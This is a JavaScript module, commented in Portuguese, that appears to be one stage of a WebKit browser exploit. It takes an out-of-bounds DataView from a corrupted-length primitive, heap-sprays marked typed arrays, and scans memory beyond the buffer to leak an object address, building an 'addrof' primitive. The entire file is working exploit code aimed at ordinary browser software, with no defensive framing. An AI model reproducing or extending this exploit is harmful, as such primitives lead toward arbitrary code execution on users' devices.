// js/script3/testArrayBufferVictimCrash.mjs (R44.2 - OOB com Leitura Insegura e Funcional)
import { logS3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import { triggerOOB_primitive, getOOBDataView } from '../core_exploit.mjs'; // Importando o DataView da OOB

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OOB_MemScan_R44_2_FIXED";

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (R44.2)
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Estratégia OOB com Leitura Insegura ---`, "test");
    
    let addrof_result = { success: false, msg: "Addrof (R44.2): Não iniciado.", address: null };

    try {
        // ETAPA 1: Ativar a Vulnerabilidade OOB
        logS3("--- ETAPA 1 (R44.2): Ativando a vulnerabilidade OOB ---", "subtest");
        await triggerOOB_primitive({ force_reinit: true });
        const oob_dv = getOOBDataView(); // Pega a referência direta ao DataView com m_length corrompido
        if (!oob_dv) {
            throw new Error("Falha ao obter o oob_dataview_real do core_exploit.");
        }
        logS3("    Vulnerabilidade OOB ativada. DataView corrompido está pronto.", "vuln");

        // Função de leitura "insegura" que confia no m_length corrompido do DataView
        const unsafe_oob_read = (offset, byteLength) => {
            switch (byteLength) {
                case 4: return oob_dv.getUint32(offset, true);
                case 8: {
                    const low = oob_dv.getUint32(offset, true);
                    const high = oob_dv.getUint32(offset + 4, true);
                    return new AdvancedInt64(low, high);
                }
                default: throw new Error(`Tamanho de leitura inválido: ${byteLength}`);
            }
        };

        // ETAPA 2: Heap Spray
        logS3("--- ETAPA 2 (R44.2): Heap Spraying ---", "subtest");
        const SPRAY_COUNT = 512;
        const unique_marker = 0x42420000;
        let sprayed_leakers = [];
        for (let i = 0; i < SPRAY_COUNT; i++) {
            let leaker = new Uint32Array(8);
            leaker[0] = unique_marker + i;
            sprayed_leakers.push(leaker);
        }
        logS3(`    Spray de ${SPRAY_COUNT} 'leakers' concluído.`, "info");

        // ETAPA 3: Busca de Memória Global com Leitura Insegura
        logS3("--- ETAPA 3 (R44.2): Buscando na memória por um 'leaker'...", "subtest");
        let found_leaker_address = null;
        
        // A busca agora pode ir além do buffer de 1MB, pois usamos a leitura insegura.
        const SEARCH_START_OFFSET = 0x100000; // Começa a busca logo após o nosso buffer OOB
        const SEARCH_WINDOW = 0x400000; // Janela de busca de 4MB

        logS3(`    Iniciando busca de [${toHex(SEARCH_START_OFFSET)}] até [${toHex(SEARCH_START_OFFSET + SEARCH_WINDOW)}]`, 'info');

        for (let offset = SEARCH_START_OFFSET; offset < SEARCH_START_OFFSET + SEARCH_WINDOW; offset += 4) {
            try {
                const val = unsafe_oob_read(offset, 4);
                if ((val & 0xFFFF0000) === unique_marker) {
                    const leaker_index = val - unique_marker;
                    
                    // OFFSET IMPORTANTE: O ponteiro do JSCell está ANTES dos dados do array. 0x10 é um valor comum.
                    const JSCell_HEADER_OFFSET_FROM_DATA = 0x10;
                    
                    const leaker_jscell_addr = unsafe_oob_read(offset - JSCell_HEADER_OFFSET_FROM_DATA, 8);
                    
                    addrof_result.success = true;
                    addrof_result.msg = "Primitiva 'addrof' obtida com sucesso via OOB MemScan!";
                    addrof_result.address = leaker_jscell_addr.toString(true);

                    logS3(`MARCADOR ENCONTRADO!`, "vuln");
                    logS3(` -> Índice do Leaker: ${leaker_index}`, "good");
                    logS3(` -> Offset na busca: ${toHex(offset)}`, "good");
                    logS3(` -> Addr do Leaker (addrof): ${addrof_result.address}`, "leak");
                    found_leaker_address = leaker_jscell_addr;
                    break;
                }
            } catch (e) { /* Ignora erros de leitura de páginas de memória inválidas */ }
        }

        if (!found_leaker_address) {
            throw new Error("Falha ao encontrar um 'leaker' na memória. Tente ajustar a SEARCH_WINDOW ou os offsets.");
        }

    } catch (e) {
        addrof_result.msg = `EXCEPTION: ${e.message}`;
        addrof_result.success = false;
    }

    return {
        errorOccurred: addrof_result.success ? null : addrof_result.msg,
        addrof_result: addrof_result,
    };
}
